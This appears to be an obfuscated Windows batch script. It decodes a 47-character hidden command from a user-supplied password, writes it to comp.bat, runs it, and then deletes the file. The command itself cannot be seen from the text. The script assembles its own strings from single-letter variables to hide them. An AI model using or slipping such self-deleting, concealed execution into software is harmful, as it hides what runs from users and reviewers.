    @echo off
     
    set reg1=1
    set lin= 
    set var1=6
    set var2=4
    set var3=1
    set var4=3
    set var5=2
    set var6=5
    set var7=8
    set var8=9
    set var9=0
    set var10=7
    set var11=e
    set var12=t
    set var13=d
    set var14=i
    set var15=k
    set var16=l
    set var17=x
    set var18=c
    set var19=m
    set var20=u
    set var21=o
    set var22=p
    set var23=.
    set var26=b
    set var25=a
     
    set /p pass= PASS:
     
    :bucle1
    if %reg1%==%var3% (set /a cod=%pass:~0,4%/38%var4%&& goto sig1)
    if %reg1%==%var5% (set /a cod=%pass:~0,4%/575&& goto sig1)
    if %reg1%==%var4% (set /a cod=%pass:~0,4%/9%var4%&& goto sig1)
    if %reg1%==4 (set /a cod=%pass:~0,4%/90&& goto sig1)
    if %reg1%==5 (set /a cod=%pass:~0,4%/2%var3%5&& goto sig1)
    if %reg1%==6 (set /a cod=%pass:~0,4%/8%var1%&& goto sig1)
    if %reg1%==7 (set /a cod=%pass:~0,4%/%var3%8%var3%&& goto sig1)
    if %reg1%==8 (set /a cod=%pass:~0,4%/%var3%81&& goto sig1)
    if %reg1%==9 (set /a cod=%pass:~0,4%/90&& goto sig1)
    if %reg1%==%var3%0 (set /a cod=%pass:~0,4%/88&& goto sig1)
    if %reg1%==1%var3% (set /a cod=%pass:~0,4%/88&& goto sig1)
    if %reg1%==12 (set /a cod=%pass:~0,4%/%var3%18&& goto sig1)
    if %reg1%==1%var4% (set /a cod=%pass:~0,4%/1%var3%5&& goto sig1)
    if %reg1%==14 (set /a cod=%pass:~0,4%/111&& goto sig1)
    if %reg1%==15 (set /a cod=%pass:~0,4%/95&& goto sig1)
    if %reg1%==%var3%6 (set /a cod=%pass:~0,4%/8%var1%&& goto sig1)
    if %reg1%==17 (set /a cod=%pass:~0,4%/8%var2%&& goto sig1)
    if %reg1%==%var3%8 (set /a cod=%pass:~0,4%/8%var1%&& goto sig1)
    if %reg1%==%var3%9 (set /a cod=%pass:~0,4%/1%var3%50&& goto sig1)
    if %reg1%==20 (set /a cod=%pass:~0,4%/2%var4%0&& goto sig1)
    if %reg1%==2%var3% (set /a cod=%pass:~0,4%/9%var4%&& goto sig1)
    if %reg1%==22 (set /a cod=%pass:~0,4%/%var1%90&& goto sig1)
    if %reg1%==23 (set /a cod=%pass:~0,4%/%var3%150&& goto sig1)
    if %reg1%==24 (set /a cod=%pass:~0,4%/%var2%31&& goto sig1)
    if %reg1%==25 (set /a cod=%pass:~0,4%/230&& goto sig1)
    if %reg1%==26 (set /a cod=%pass:~0,4%/93&& goto sig1)
    if %reg1%==27 (set /a cod=%pass:~0,4%/18%var3%&& goto sig1)
    if %reg1%==28 (set /a cod=%pass:~0,4%/%var4%83&& goto sig1)
    if %reg1%==29 (set /a cod=%pass:~0,4%/93&& goto sig1)
    if %reg1%==30 (set /a cod=%pass:~0,4%/15%var1%&& goto sig1)
    if %reg1%==3%var3% (set /a cod=%pass:~0,4%/%var1%90&& goto sig1)
    if %reg1%==32 (set /a cod=%pass:~0,4%/%var3%81&& goto sig1)
    if %reg1%==%var4%3 (set /a cod=%pass:~0,4%/9%var4%&& goto sig1)
    if %reg1%==34 (set /a cod=%pass:~0,4%/%var1%90&& goto sig1)
    if %reg1%==35 (set /a cod=%pass:~0,4%/18%var3%&& goto sig1)
    if %reg1%==36 (set /a cod=%pass:~0,4%/172&& goto sig1)
    if %reg1%==%var4%7 (set /a cod=%pass:~0,4%/230&& goto sig1)
    if %reg1%==38 (set /a cod=%pass:~0,4%/9%var4%&& goto sig1)
    if %reg1%==39 (set /a cod=%pass:~0,4%/%var1%90&& goto sig1)
    if %reg1%==40 (set /a cod=%pass:~0,4%/%var3%91&& goto sig1)
    if %reg1%==4%var3% (set /a cod=%pass:~0,4%/%var1%90&& goto sig1)
    if %reg1%==42 (set /a cod=%pass:~0,4%/%var3%81&& goto sig1)
    if %reg1%==4%var4% (set /a cod=%pass:~0,4%/93&& goto sig1)
    if %reg1%==44 (set /a cod=%pass:~0,4%/8%var1%2&& goto sig1)
    if %reg1%==45 (set /a cod=%pass:~0,4%/%var4%83&& goto sig1)
    if %reg1%==46 (set /a cod=%pass:~0,4%/2%var4%0&& goto sig1)
    if %reg1%==47 (set /a cod=%pass:~0,4%/18%var3%&& goto sig1)
     
     
    :sig1
    set /a reg1=%reg1%+1
    set var27=%var13%%var11%%var16% %var18%%var21%%var19%%var22%%var23%%var26%%var25%%var12%
    set var24=%var11%%var17%%var14%%var12%
    if %cod%==3 (set simbol=c&& goto sig2)
    if %cod%==4 (set simbol=d&& goto sig2)
    if %cod%==5 (set simbol=e&& goto sig2)
    if %cod%==6 (set simbol=f&& goto sig2)
    if %cod%==7 (set simbol=g&& goto sig2)
    if %cod%==8 (set simbol=h&& goto sig2)
    if %cod%==9 (set simbol=i&& goto sig2)
    if %cod%==10 (set simbol=j&& goto sig2)
    if %cod%==11 (set simbol=k&& goto sig2)
    if %cod%==12 (set simbol=l&& goto sig2)
    if %cod%==13 (set simbol=m&& goto sig2)
    if %cod%==14 (set simbol=n&& goto sig2)
    if %cod%==15 (set simbol=o&& goto sig2)
    if %cod%==16 (set simbol=p&& goto sig2)
    if %cod%==17 (set simbol=q&& goto sig2)
    if %cod%==18 (set simbol=r&& goto sig2)
    if %cod%==19 (set simbol=s&& goto sig2)
    if %cod%==20 (set simbol=t&& goto sig2)
    if %cod%==21 (set simbol=u&& goto sig2)
    if %cod%==22 (set simbol=v&& goto sig2)
    if %cod%==23 (set simbol=w&& goto sig2)
    if %cod%==24 (set simbol=x&& goto sig2)
    if %cod%==25 (set simbol=y&& goto sig2)
    if %cod%==26 (set simbol=z&& goto sig2)
    if %cod%==27 (set simbol=1&& goto sig2)
    if %cod%==28 (set simbol=2&& goto sig2)
    if %cod%==29 (set simbol=3&& goto sig2)
    if %cod%==30 (set simbol=4&& goto sig2)
    if %cod%==31 (set simbol=5&& goto sig2)
    if %cod%==32 (set simbol=6&& goto sig2)
    if %cod%==33 (set simbol=7&& goto sig2)
    if %cod%==34 (set simbol=8&& goto sig2)
    if %cod%==35 (set simbol=9&& goto sig2)
    if %cod%==36 (set simbol=0&& goto sig2)
    if %cod%==37 (set simbol= && goto sig2)
    if %cod%==38 (set simbol=%%&& goto sig2)
    if %cod%==39 (set simbol==&& goto sig2)
    if %cod%==40 (set simbol=a&& goto sig2)
    if %cod%==41 (set simbol=b&& goto sig2) else %var24%
     
    :sig2
    set lin=%lin%%simbol%
    if not %reg1%==48 goto bucle1
     
     
    echo %lin% > comp.bat
    call comp.bat
    %var27%
     
    pause > nul